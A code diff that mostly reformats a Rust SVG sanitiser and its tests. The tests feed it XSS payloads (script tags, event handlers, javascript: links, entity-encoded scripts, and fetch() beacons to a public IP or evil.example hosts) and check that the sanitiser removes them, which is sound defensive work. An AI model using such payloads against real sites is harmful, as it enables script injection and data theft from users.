@@ -562,10 +562,14 @@ pub fn neutralise_svg(text: &str) -> Option<String> {
                     }
                     let (ans, alocal) = reader.resolver().resolve_attribute(a.key);
                     let alocal = alocal.into_inner().to_string();
-                    let value = a.normalized_value(quick_xml::XmlVersion::Implicit1_0).ok()?;
+                    let value = a
+                        .normalized_value(quick_xml::XmlVersion::Implicit1_0)
+                        .ok()?;
                     let name = match ans {
                         ResolveResult::Unbound => alocal.clone(),
-                        ResolveResult::Bound(n) if n.as_ref() == XLINK_NS => format!("xlink:{alocal}"),
+                        ResolveResult::Bound(n) if n.as_ref() == XLINK_NS => {
+                            format!("xlink:{alocal}")
+                        }
                         ResolveResult::Bound(n) if n.as_ref() == XML_NS => format!("xml:{alocal}"),
                         ResolveResult::Bound(_) => continue,
                         ResolveResult::Unknown(_) => return None,
@@ -578,7 +582,10 @@ pub fn neutralise_svg(text: &str) -> Option<String> {
                     }
                 }
                 let target = target.rsplit(':').next().unwrap_or("");
-                let animation = matches!(local.as_str(), "animate" | "set" | "animateMotion" | "animateTransform");
+                let animation = matches!(
+                    local.as_str(),
+                    "animate" | "set" | "animateMotion" | "animateTransform"
+                );
                 let kept = is_svg
                     && SVG_ELEMENTS.contains(&local.as_str())
                     && !(animation && (target == "href" || target.starts_with("on")));
@@ -615,9 +622,7 @@ pub fn neutralise_svg(text: &str) -> Option<String> {
                     skipping -= 1;
                     continue;
                 }
-                if open.pop().is_none() {
-                    return None;
-                }
+                open.pop()?;
                 let local = e.local_name().into_inner().to_string();
                 if local == "style"
                     && let Some(css_text) = style.take()
@@ -693,15 +698,23 @@ fn svg_attribute(name: &str, value: &str) -> Option<String> {
     if lname.starts_with("on") || lname == "xml:base" {
         return None;
     }
-    if !name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':')) {
+    if !name
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':'))
+    {
         return None;
     }
     if name == "href" || name == "xlink:href" {
         let t = css::url_text(value);
         let lower = t.to_ascii_lowercase();
-        let picture = ["data:image/png", "data:image/jpeg", "data:image/gif", "data:image/webp"]
-            .iter()
-            .any(|p| lower.starts_with(p) && lower[p.len()..].starts_with([';', ',']));
+        let picture = [
+            "data:image/png",
+            "data:image/jpeg",
+            "data:image/gif",
+            "data:image/webp",
+        ]
+        .iter()
+        .any(|p| lower.starts_with(p) && lower[p.len()..].starts_with([';', ',']));
         return (t.starts_with('#') || picture).then_some(t);
     }
     let value = if name == "style" || value.contains('(') {
@@ -854,28 +867,55 @@ mod tests {
         let svg = r##"<?xml version="1.0"?><?xml-stylesheet href="https://evil.example/x.css"?><!-- c --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)"><circle r="4" fill="#33f" onclick="x()"/></a><foreignObject><iframe src="https://evil"></iframe></foreignObject><text>ok &amp; &lt;b&gt;</text><use xlink:href="#dot"/><image href="data:image/png;base64,AAAA"/><image href="https://evil.example/i.png"/><rect style="fill:url(#g);background:url(//evil.example/b.png)" filter="url(file://evil.example/f.svg#f)"/><style><![CDATA[ .a > .b { fill: url(https://evil.example/p.svg#p) } ]]></style><animate attributeName="href" values="javascript:alert(4)"/><set attributeName="xlink:href" to="javascript:alert(5)"/><animate attributeName="opacity" values="0;1"/></svg>"##;
         let clean = neutralise_svg(svg).expect("kept");
         let lower = clean.to_ascii_lowercase();
-        for gone in ["script", "onload", "onclick", "javascript", "iframe", "foreignobject", "evil", "<!--", "<?"] {
+        for gone in [
+            "script",
+            "onload",
+            "onclick",
+            "javascript",
+            "iframe",
+            "foreignobject",
+            "evil",
+            "<!--",
+            "<?",
+        ] {
             assert!(!lower.contains(gone), "{gone}: {clean}");
         }
         assert!(clean.starts_with("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">"), "{clean}");
-        assert!(clean.contains("<a><circle r=\"4\" fill=\"#33f\"/></a>"), "{clean}");
+        assert!(
+            clean.contains("<a><circle r=\"4\" fill=\"#33f\"/></a>"),
+            "{clean}"
+        );
         assert!(clean.contains("<text>ok &amp; &lt;b&gt;</text>"), "{clean}");
         assert!(clean.contains("<use xlink:href=\"#dot\"/>"), "{clean}");
-        assert!(clean.contains("<image href=\"data:image/png;base64,AAAA\"/><image/>"), "{clean}");
-        assert!(clean.contains("<style> .a &gt; .b { fill: url(\"about:invalid\") } </style>"), "{clean}");
-        assert!(clean.contains("<animate attributeName=\"opacity\" values=\"0;1\"/></svg>"), "{clean}");
+        assert!(
+            clean.contains("<image href=\"data:image/png;base64,AAAA\"/><image/>"),
+            "{clean}"
+        );
+        assert!(
+            clean.contains("<style> .a &gt; .b { fill: url(\"about:invalid\") } </style>"),
+            "{clean}"
+        );
+        assert!(
+            clean.contains("<animate attributeName=\"opacity\" values=\"0;1\"/></svg>"),
+            "{clean}"
+        );
         // Cleaning the clean picture changes nothing.
         assert_eq!(neutralise_svg(&clean).as_deref(), Some(clean.as_str()));
         // A plain icon keeps its shapes; one without a namespace gets the SVG one.
         let icon = r#"<svg viewBox="0 0 10 10"><path d="M0 0h10v10z"/></svg>"#;
         assert_eq!(
             neutralise_svg(icon).as_deref(),
-            Some("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 10 10\"><path d=\"M0 0h10v10z\"/></svg>")
+            Some(
+                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 10 10\"><path d=\"M0 0h10v10z\"/></svg>"
+            )
         );
         // An encoded address is read as the browser reads it, and goes.
         let enc = neutralise_svg(r#"<svg xmlns="http://www.w3.org/2000/svg"><a href="&#106;avascript:alert(1)">x</a></svg>"#).unwrap();
         assert!(!enc.contains("href"), "{enc}");
-        assert!(neutralise_svg(r#"<svg><SCRIPT>alert(1)</SCRIPT></svg>"#).is_some_and(|s| !s.contains("alert")));
+        assert!(
+            neutralise_svg(r#"<svg><SCRIPT>alert(1)</SCRIPT></svg>"#)
+                .is_some_and(|s| !s.contains("alert"))
+        );
         // A prefix nobody declared, broken XML and not-an-SVG are left out.
         for bad in [
             r#"<svg><svg:script>alert(1)</svg:script></svg>"#,
@@ -895,17 +935,29 @@ mod tests {
     #[test]
     fn disguised_scripts_in_svg_pictures_are_gone() {
         let pub_ = "http://93.184.215.14:8080";
-        let c1 = format!("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"green\"/><_:script xmlns:_=\"http://www.w3.org/2000/svg\">document.documentElement.setAttribute(\"data-pwned\",\"C1\");fetch(\"{pub_}/BEACON-C1\")</_:script></svg>");
-        let c2 = format!("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"blue\"/><h.x:script xmlns:h.x=\"http://www.w3.org/1999/xhtml\">document.documentElement.setAttribute(\"data-pwned\",\"C2\");fetch(\"{pub_}/BEACON-C2\")</h.x:script></svg>");
-        let c3 = format!("<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x \"&#60;script&#62;document.documentElement.setAttribute(&#34;data-pwned&#34;,&#34;C3&#34;);fetch(&#34;{pub_}/BEACON-C3&#34;)&#60;/script&#62;\">]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"orange\"/>&x;</svg>");
+        let c1 = format!(
+            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"green\"/><_:script xmlns:_=\"http://www.w3.org/2000/svg\">document.documentElement.setAttribute(\"data-pwned\",\"C1\");fetch(\"{pub_}/BEACON-C1\")</_:script></svg>"
+        );
+        let c2 = format!(
+            "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"blue\"/><h.x:script xmlns:h.x=\"http://www.w3.org/1999/xhtml\">document.documentElement.setAttribute(\"data-pwned\",\"C2\");fetch(\"{pub_}/BEACON-C2\")</h.x:script></svg>"
+        );
+        let c3 = format!(
+            "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x \"&#60;script&#62;document.documentElement.setAttribute(&#34;data-pwned&#34;,&#34;C3&#34;);fetch(&#34;{pub_}/BEACON-C3&#34;)&#60;/script&#62;\">]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\"><rect width=\"20\" height=\"20\" fill=\"orange\"/>&x;</svg>"
+        );
         let c4 = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" x=\">\" onload=\"document.documentElement.setAttribute('data-pwned','C4')\"><rect width=\"20\" height=\"20\"/></svg>".to_string();
         for (name, svg) in [("C1", &c1), ("C2", &c2), ("C4", &c4)] {
             let clean = neutralise_svg(svg).unwrap_or_else(|| panic!("{name} keeps its picture"));
             for gone in ["script", "pwned", "BEACON", "onload"] {
                 assert!(!clean.contains(gone), "{name}: {gone} in {clean}");
             }
-            assert!(clean.contains("<rect width=\"20\" height=\"20\""), "{name}: {clean}");
+            assert!(
+                clean.contains("<rect width=\"20\" height=\"20\""),
+                "{name}: {clean}"
+            );
         }
-        assert!(neutralise_svg(&c3).is_none(), "a document type is never kept");
+        assert!(
+            neutralise_svg(&c3).is_none(),
+            "a document type is never kept"
+        );
     }
 }
